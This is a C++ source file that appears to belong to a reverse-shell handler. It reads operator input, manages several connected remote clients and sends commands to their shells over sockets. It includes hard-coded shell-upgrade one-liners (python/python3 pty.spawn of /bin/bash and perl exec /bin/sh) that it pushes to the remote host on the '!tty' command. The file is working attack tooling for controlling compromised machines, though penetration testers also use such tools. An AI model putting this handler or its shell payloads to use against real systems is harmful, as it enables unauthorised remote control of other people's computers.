// Copyright (c) Nouman Tajik [github.com/tajiknomi]
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

#include "ServerQueries.h"
#include "UsageHelper.h"
#include <iostream>
#include <string>
#include <vector>
#include "clientManager.h"
#include <sys/socket.h>
#include <unistd.h>
#include <unordered_map>
#include "signalManager.h"

#define INVALID_SOCKET -1


std::string first_numberstring(std::string const& str){
	char const* digits = "0123456789";
	std::size_t const n = str.find_first_of(digits);
	if (n != std::string::npos)
	{
		std::size_t const m = str.find_first_not_of(digits, n);
		return str.substr(n, m != std::string::npos ? m - n : m);
	}
	return std::string();
}

void ServerQueries_t(std::shared_ptr<ClientsManager> clientManager_ptr) {
	
	blockSIGINT(); // Block SIGINT for this thread

	while (true) {

		std::string input_cmd;
		std::getline(std::cin, input_cmd);
		
		if(input_cmd[0] == '!'){
			if(std::isdigit(input_cmd[1])){
				clientManager_ptr->setActiveClient(stoi(first_numberstring(input_cmd)));
			}
			else if (!(input_cmd.compare(0, std::string("!exit").length(), std::string("!exit")))) {
				::close(clientManager_ptr->getActiveClientSocket());
			}
			else if (!(input_cmd.compare(0, std::string("!list").length(), std::string("!list")))) {
				clientManager_ptr->printValidClients();
			}
			else if (!(input_cmd.compare(0, std::string("!clear").length(), std::string("!clear")))) {
				int retValue = std::system("clear");
			}
			else if (!(input_cmd.compare(0, std::string("!tty").length(), std::string("!tty")))) {
    			std::string ttyOption = input_cmd.substr(std::string("!tty").length());
    			ttyOption.erase(0, ttyOption.find_first_not_of(" \t")); // Trim leading spaces
				if(ttyOption.empty()){
					ttyOption = "py3";		// default to python3 if not specified
				}
				const std::unordered_map<std::string, std::string> ttyCommands = {
					{"py", "python -c 'import pty; pty.spawn(\"/bin/bash\")'\nexport TERM=xterm\n"},
					{"py3", "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\nexport TERM=xterm\n"},
					{"perl", "perl -e 'exec \"/bin/sh\";'\nexport TERM=xterm\n"}
				};
				// Find the selected command
				auto it = ttyCommands.find(ttyOption);
				if (it != ttyCommands.end()) {
					const std::string& tty = it->second;
					::send(clientManager_ptr->getActiveClientSocket(), tty.c_str(), tty.size(), 0);
				}
			}
			else if (!(input_cmd.compare(0, std::string("!ctrlc").length(), std::string("!ctrlc")))) {
				char ctrl_c = 0x03; // ASCII for Ctrl+C
				::send(clientManager_ptr->getActiveClientSocket(), &ctrl_c, 1, 0);
			}
			else if (!(input_cmd.compare(0, std::string("!quit").length(), std::string("!quit")))) {
				exit(0);	// terminate program
			}
			else {
				printUsageExamples();
			}
			continue;
		}
		if (clientManager_ptr->getActiveClientSocket() == INVALID_SOCKET) {
			clientManager_ptr->printValidClients();
			continue;
		}
		input_cmd.append("\n");

		//	Send the packet through socket
		::send(clientManager_ptr->getActiveClientSocket(), input_cmd.c_str(), input_cmd.size(), 0);
	}
}